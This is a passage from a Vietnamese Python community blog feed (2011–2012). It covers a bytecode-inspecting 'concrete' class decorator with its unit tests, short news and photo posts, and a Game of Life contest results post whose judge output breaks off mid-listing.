&lt;p&gt;Điểm đáng lưu ý là tất cả các lớp này đều hợp lệ trong Python. Chúng ta hoàn toàn có thể khởi tạo một đối tượng của một trong ba lớp này và chỉ đến khi gọi một hàm nào đó thì biệt lệ mới xảy ra. Nói cách khác, biệt lệ &lt;strong&gt;NotImplementedError&lt;/strong&gt; chỉ được phát hiện khi chạy, trong khi đáng lẽ nó đã phải được phát hiện ngay khi dịch. Điều này làm mất giá trị của một hợp đồng, và hạn chế việc áp dụng hướng lập trình giao diện trong Python.&lt;/p&gt;
&lt;p&gt;Để khắc phục điểm yếu này, tôi đã viết một bộ trang hoàng (decorator) nhỏ để bắt lỗi ngay khi một lớp cụ thể được định nghĩa thiếu. Định nghĩa thiếu ở đây mang ý nghĩa rằng lớp cụ thể đã quên định nghĩa một phương thức nào đó.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;Set of (class) decorators to help with interface programming.&lt;/span&gt;

&lt;span class="sd"&gt;Examples::&lt;/span&gt;

&lt;span class="sd"&gt;  @concrete&lt;/span&gt;
&lt;span class="sd"&gt;  class subclass(parent):&lt;/span&gt;
&lt;span class="sd"&gt;      ...&lt;/span&gt;

&lt;span class="sd"&gt;Released to the public domain.&lt;/span&gt;

&lt;span class="sd"&gt;Nam T. Nguyen, 2012&lt;/span&gt;

&lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;dis&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;types&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;unittest&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;concrete&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;orig_class&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;A decorator to ensure that a concrete class has no un-implemented&lt;/span&gt;
&lt;span class="sd"&gt;    methods.&lt;/span&gt;

&lt;span class="sd"&gt;    An un-implemented method is defined similarly to::&lt;/span&gt;

&lt;span class="sd"&gt;        def method(...):&lt;/span&gt;
&lt;span class="sd"&gt;            raise NotImplementedError()&lt;/span&gt;

&lt;span class="sd"&gt;    This, when translated to bytecode, looks like::&lt;/span&gt;

&lt;span class="sd"&gt;        LOAD_GLOBAL       0 (NotImplementedError)&lt;/span&gt;
&lt;span class="sd"&gt;        CALL_FUNCTION     1&lt;/span&gt;
&lt;span class="sd"&gt;        RAISE_VARARGS     1&lt;/span&gt;
&lt;span class="sd"&gt;        ...&lt;/span&gt;

&lt;span class="sd"&gt;    Or when ``raise NotImplementedError``::&lt;/span&gt;

&lt;span class="sd"&gt;        LOAD_GLOBAL       0 (NotImplementedError)&lt;/span&gt;
&lt;span class="sd"&gt;        RAISE_VARARGS     1&lt;/span&gt;
&lt;span class="sd"&gt;        ...&lt;/span&gt;

&lt;span class="sd"&gt;    The check here is for such pattern.&lt;/span&gt;

&lt;span class="sd"&gt;    &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;orig_class&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;func&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;getattr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;orig_class&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="c1"&gt;# correct type?&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;types&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FunctionType&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;types&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MethodType&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;continue&lt;/span&gt;
        &lt;span class="c1"&gt;# check if first name is NotImplementedError&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;func_code&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;co_names&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; \
                &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;func_code&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;co_names&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;NotImplementedError&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;continue&lt;/span&gt;
        &lt;span class="c1"&gt;# and RAISE_VARARGS somewhere after that&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;position&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;func_code&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;co_code&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;position&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;continue&lt;/span&gt;
            &lt;span class="n"&gt;opcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;func_code&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;co_code&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;position&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;dis&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;opname&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;opcode&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;RAISE_VARARGS&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;SyntaxError&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Function &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;.&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt; must be implemented.&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
                        &lt;span class="n"&gt;orig_class&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__name__&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;func_name&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;orig_class&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ConcreteTest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unittest&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TestCase&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_raise&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;test1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;NotImplementedError&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertRaises&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ne"&gt;SyntaxError&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;concrete&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;test1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;test2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;NotImplementedError&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertRaises&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ne"&gt;SyntaxError&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;concrete&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;test2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_not_raise&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;test&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="ne"&gt;NotImplementedError&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;concrete&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_subclass&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;parent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;override_me&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;NotImplementedError&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;test&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;parent&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;leave_it&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="k"&gt;pass&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertRaises&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ne"&gt;SyntaxError&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;concrete&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;unittest&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Để sử dụng bộ trang hoàng &lt;strong&gt;concrete&lt;/strong&gt; này, ta sẽ sửa lại lớp &lt;strong&gt;ConcreteClass&lt;/strong&gt; như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@concrete&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ConcreteClass&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AbstractClass&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="c1"&gt;# như trên&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nếu &lt;strong&gt;ConcreteClass&lt;/strong&gt; quên hiện thực hóa một phương thức nào đó, Python sẽ thông báo &lt;strong&gt;SyntaxError&lt;/strong&gt; ngay sau khi &lt;strong&gt;ConcreteClass&lt;/strong&gt; được định nghĩa.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="tom-tat"&gt;
&lt;h2&gt;Tóm tắt&lt;/h2&gt;
&lt;p&gt;Lập trình giao diện giúp chúng ta tách biệt hai yếu tố là cái gì, và như thế nào. Người sử dụng quan tâm nhiều đến câu hỏi &lt;strong&gt;cái gì&lt;/strong&gt; được thực hiện hơn là làm sao để thực hiện chúng. Trong khi người cung cấp có thể dễ dàng thay đổi &lt;strong&gt;cách thực hiện&lt;/strong&gt; miễn sao vẫn đảm bảo câu chữ của hợp đồng.&lt;/p&gt;
&lt;p&gt;Python không có sẵn cơ chế giao diện và lớp trừu tượng như các ngôn ngữ lập trình khác. Chúng ta phải sử dụng bộ trang hoàng &lt;strong&gt;concrete&lt;/strong&gt; để bắt lỗi định nghĩa thiếu.&lt;/p&gt;
&lt;p&gt;Hy vọng bài viết ngắn này sẽ đem lại cho bạn đọc một mẹo lập trình giao diện hữu ích trong Python.&lt;/p&gt;
&lt;/div&gt;
</content><category term="interface"></category><category term="concrete"></category><category term="abstract"></category><category term="design"></category></entry><entry><title>Python - Ngôn Ngữ Lập Trình Tốt Nhất</title><link href="/2011/12/python-ngon-ngu-lap-trinh-tot-nhat.html" rel="alternate"></link><published>2011-12-09T19:13:00+07:00</published><updated>2011-12-09T19:13:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2011-12-09:/2011/12/python-ngon-ngu-lap-trinh-tot-nhat.html</id><summary type="html">&lt;p&gt;Tạp chí Linux Journal đã công bố kết quả khảo sát người đọc hàng năm của mình vào ngày 01 tháng 12 vừa qua. Theo đánh giá này, Python lại một lần nữa trong suốt ba năm liên tục được người đọc đánh giá là &lt;strong&gt;ngôn ngữ lập trình tốt …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Tạp chí Linux Journal đã công bố kết quả khảo sát người đọc hàng năm của mình vào ngày 01 tháng 12 vừa qua. Theo đánh giá này, Python lại một lần nữa trong suốt ba năm liên tục được người đọc đánh giá là &lt;strong&gt;ngôn ngữ lập trình tốt nhất&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Thông tin chi tiết có thể được xem thêm từ nguồn &lt;a class="reference external" href="http://www.linuxjournal.com/slideshow/readers-choice-2011?page=27"&gt;Linux Journal&lt;/a&gt;.&lt;/p&gt;
</content><category term="python"></category></entry><entry><title>Câu chuyện tối ưu hóa đoạn mã Python</title><link href="/2011/10/cau-chuyen-toi-uu-hoa-doan-ma-python.html" rel="alternate"></link><published>2011-10-26T02:21:00+07:00</published><updated>2011-10-26T02:21:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2011-10-26:/2011/10/cau-chuyen-toi-uu-hoa-doan-ma-python.html</id><summary type="html">&lt;p&gt;Trên trang blog của Dropbox ngày hôm qua có chia sẻ kinh nghiệm của họ trong việc tối ưu hóa một đoạn mã Python ngắn.&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="http://tech.dropbox.com/?p=89"&gt;http://tech.dropbox.com/?p=89&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Kết luận của họ là:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Các kỹ thuật căn bản như &lt;strong&gt;inline hàm&lt;/strong&gt; (inline function), &lt;strong&gt;tự lặp&lt;/strong&gt; (implicit loop …&lt;/li&gt;&lt;/ol&gt;</summary><content type="html">&lt;p&gt;Trên trang blog của Dropbox ngày hôm qua có chia sẻ kinh nghiệm của họ trong việc tối ưu hóa một đoạn mã Python ngắn.&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="http://tech.dropbox.com/?p=89"&gt;http://tech.dropbox.com/?p=89&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Kết luận của họ là:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Các kỹ thuật căn bản như &lt;strong&gt;inline hàm&lt;/strong&gt; (inline function), &lt;strong&gt;tự lặp&lt;/strong&gt; (implicit loop), &lt;strong&gt;tận dụng mã C&lt;/strong&gt; đều đúng.&lt;/li&gt;
&lt;li&gt;Cấu trúc &lt;strong&gt;set&lt;/strong&gt; và &lt;strong&gt;dict&lt;/strong&gt; trong Python rất nhanh.&lt;/li&gt;
&lt;li&gt;Việc sử dụng biến &lt;strong&gt;nội bộ thay cho toàn cục&lt;/strong&gt; mặc dù có ích, nhưng không nhiều.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ghép chuỗi&lt;/strong&gt; (string concatenation) nhanh hơn nhiều so với &lt;strong&gt;định dạng chuỗi&lt;/strong&gt; (string interpolation).&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Đây là một bài chia sẻ rất hay.&lt;/p&gt;
</content><category term="optimize"></category></entry><entry><title>Hình ảnh tại Software Freedom Day 2010</title><link href="/2011/10/hinh-anh-tai-software-freedom-day-2010.html" rel="alternate"></link><published>2011-10-24T00:50:00+07:00</published><updated>2011-10-24T00:50:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2011-10-24:/2011/10/hinh-anh-tai-software-freedom-day-2010.html</id><summary type="html">&lt;p&gt;Hôm nay tự nhiên thấy trên máy có mấy tấm hình cũ ở Ngày Phần Mềm Tự Do 2010 vẫn chưa được đăng.&lt;/p&gt;
&lt;p&gt;Năm 2010, thành viên Phan Đắc Anh Huy đã trình bày về phần mềm Vithon Forum (chính là phần mềm được sử dụng để làm Diễn đàn …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hôm nay tự nhiên thấy trên máy có mấy tấm hình cũ ở Ngày Phần Mềm Tự Do 2010 vẫn chưa được đăng.&lt;/p&gt;
&lt;p&gt;Năm 2010, thành viên Phan Đắc Anh Huy đã trình bày về phần mềm Vithon Forum (chính là phần mềm được sử dụng để làm Diễn đàn của nhóm PCNV). Sau đây là các tấm hình chụp hôm đó.&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="" src="http://img36.imageshack.us/img36/1311/img20100918104740.th.jpg" /&gt;
&lt;p class="caption"&gt;&lt;a class="reference external" href="http://img36.imageshack.us/i/img20100918104740.jpg/"&gt;http://img36.imageshack.us/i/img20100918104740.jpg/&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="figure"&gt;
&lt;img alt="" src="http://img37.imageshack.us/img37/9138/img20100918104748.th.jpg" /&gt;
&lt;p class="caption"&gt;&lt;a class="reference external" href="http://img37.imageshack.us/i/img20100918104748.jpg/"&gt;http://img37.imageshack.us/i/img20100918104748.jpg/&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="figure"&gt;
&lt;img alt="" src="http://img97.imageshack.us/img97/2699/img20100918104833.th.jpg" /&gt;
&lt;p class="caption"&gt;&lt;a class="reference external" href="http://img97.imageshack.us/i/img20100918104833.jpg/"&gt;http://img97.imageshack.us/i/img20100918104833.jpg/&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;Điều kiện ánh sáng tuy không được tốt nhưng cũng phần nào thể hiện được cái đầu du côn và thân hình phì lũ của Huy.&lt;/p&gt;
</content><category term="member"></category><category term="forum"></category></entry><entry><title>Kết quả cuộc thi Đời</title><link href="/2011/10/ket-qua-cuoc-thi-doi.html" rel="alternate"></link><published>2011-10-21T10:51:00+07:00</published><updated>2011-10-21T10:51:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2011-10-21:/2011/10/ket-qua-cuoc-thi-doi.html</id><summary type="html">&lt;p&gt;Cuộc thi Đời kết thúc vào tuần trước nhưng vì không có điều kiện truy cập Internet nên đến bây giờ ban tổ chức mới có thể công bố kết quả.&lt;/p&gt;
&lt;p&gt;Cuộc thi thu hút &lt;strong&gt;bốn&lt;/strong&gt; bài tham dự từ các bạn sau:&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="53%" /&gt;
&lt;col width="47%" /&gt;
&lt;/colgroup&gt;
&lt;thead valign="bottom"&gt;
&lt;tr&gt;&lt;th class="head"&gt;&lt;strong&gt;Tác giả&lt;/strong&gt;&lt;/th&gt;
&lt;th class="head"&gt;&lt;strong&gt;Bài tham dự&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;Nhâm Xuân …&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</summary><content type="html">&lt;p&gt;Cuộc thi Đời kết thúc vào tuần trước nhưng vì không có điều kiện truy cập Internet nên đến bây giờ ban tổ chức mới có thể công bố kết quả.&lt;/p&gt;
&lt;p&gt;Cuộc thi thu hút &lt;strong&gt;bốn&lt;/strong&gt; bài tham dự từ các bạn sau:&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="53%" /&gt;
&lt;col width="47%" /&gt;
&lt;/colgroup&gt;
&lt;thead valign="bottom"&gt;
&lt;tr&gt;&lt;th class="head"&gt;&lt;strong&gt;Tác giả&lt;/strong&gt;&lt;/th&gt;
&lt;th class="head"&gt;&lt;strong&gt;Bài tham dự&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;Nhâm Xuân Nam&lt;/td&gt;
&lt;td&gt;life.py&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Huỳnh Hải Âu&lt;/td&gt;
&lt;td&gt;bilife.py&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Phan Phụng Tiến&lt;/td&gt;
&lt;td&gt;treeoflife.py&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Vũ Khuê&lt;/td&gt;
&lt;td&gt;cuocthidoi.py&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Nhóm PCNV đã sử dụng một chương trình chấm giải đơn giản khác để đánh giá các bài này. Chương trình này chỉ đơn giản là tạo một ma trận MxN phần tử và yêu cầu các bài tham gia tính giá trị của các ô ngẫu nhiên tại một thế hệ trong tương lai.&lt;/p&gt;
&lt;p&gt;Ở vòng đầu tiên, ma trận &lt;strong&gt;1x1&lt;/strong&gt; được sử dụng:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
G:\vithon\life&amp;gt;judge.py -c 1 -r 1 -n 10000 bilife.Board life.MainBoard treeoflife.Board cuocthidoi.Board
Generating random test case
Width = 1
Height = 1

0

Executing bilife.Board
Executing life.MainBoard
Executing treeoflife.Board
Executing cuocthidoi.Board

Checking for cell (0, 0)
Traceback (most recent call last):
  File &amp;quot;G:\vithon\life\judge.py&amp;quot;, line 120, in &amp;lt;module&amp;gt;
    main()
  File &amp;quot;G:\vithon\life\judge.py&amp;quot;, line 96, in main
    if results[module_name]['object'].get_cell(row, col):
  File &amp;quot;G:\vithon\life\treeoflife.py&amp;quot;, line 160, in get_cell
    raise ValueError()
ValueError
&lt;/pre&gt;
&lt;p&gt;Vì sinh ra lỗi nên mô-đun &lt;strong&gt;treeoflife&lt;/strong&gt; đã bị loại.&lt;/p&gt;
&lt;p&gt;Ở vòng hai, ma trận &lt;strong&gt;2x2&lt;/strong&gt; được sử dụng và chỉ tính một thế hệ tương lai:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
G:\vithon\life&amp;gt;judge.py -c 2 -r 2 -n 1 bilife.Board life.MainBoard cuocthidoi.Board
Generating random test case
Width = 2
Height = 2

1 1
0 1

Executing bilife.Board
Executing life.MainBoard
Executing cuocthidoi.Board

Checking for cell (0, 1)
*** alive count = 2, dead_count = 1
bilife is eliminated

Checking for cell (1, 0)
*** alive count = 3, dead_count = 0

Checking for cell (0, 0)
*** alive count = 2, dead_count = 1
bilife is eliminated

Checking for cell (1, 1)
*** alive count = 2, dead_count = 1
bilife is eliminated

RESULT:
[+] cuocthidoi : 0.000000 seconds
[+] life : 0.000000 seconds
[-] bilife : 0.000000 seconds
&lt;/pre&gt;
&lt;p&gt;Với lần chạy này, chỉ có mô-đun &lt;strong&gt;bilife&lt;/strong&gt; đưa ra kết quả sai cho trường hợp ô &lt;strong&gt;(0, 1)&lt;/strong&gt;. Chương trình chấm so sánh kết quả của mô-đun với kết quả của &lt;strong&gt;số đông&lt;/strong&gt;. Trong trường hợp này, số đông đã đúng.&lt;/p&gt;
&lt;p&gt;Sau hai lần chạy, chỉ còn lại hai mô-đun &lt;strong&gt;life&lt;/strong&gt; và &lt;strong&gt;cuocthidoi&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Lần chạy thứ ba sử dụng ma trận &lt;strong&gt;2x2&lt;/strong&gt; với một thế hệ:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
